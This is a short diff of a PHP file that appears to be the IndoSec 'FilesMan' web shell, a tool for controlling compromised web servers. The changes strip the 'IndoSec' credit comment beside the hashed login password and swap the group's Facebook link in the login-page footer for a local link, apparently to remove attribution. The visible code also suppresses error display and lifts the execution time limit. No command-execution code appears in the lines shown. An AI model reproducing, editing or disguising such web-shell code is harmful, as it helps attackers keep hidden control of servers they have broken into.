@@ -17,7 +17,7 @@ set_time_limit(0);
 @ini_set('display_errors', 0);
 
 /* Configurasi */
-$auth_pass 			= "54062f3bf6377d42b4fab7c8fedfc7da"; // IndoSec
+$auth_pass 			= "54062f3bf6377d42b4fab7c8fedfc7da";
 $color 				= "#00ff00";
 $default_action 	= 'FilesMan';
 $default_use_ajax 	= true;
@@ -75,7 +75,7 @@ function login_shell()
 							<input type="submit" class="btn btn-danger btn-block" class="form-control" value="Login">
 						</form>
 					</div>
-				</div><a href="https://facebook.com/IndoSecOfficial" class="text-muted fixed-bottom">Copyright 2019 @ { Washere }</a><br />
+				</div><a href="?dir" class="text-muted fixed-bottom">Copyright 2019 @ { Washere }</a><br />
 			</div>
 		</center>
 		
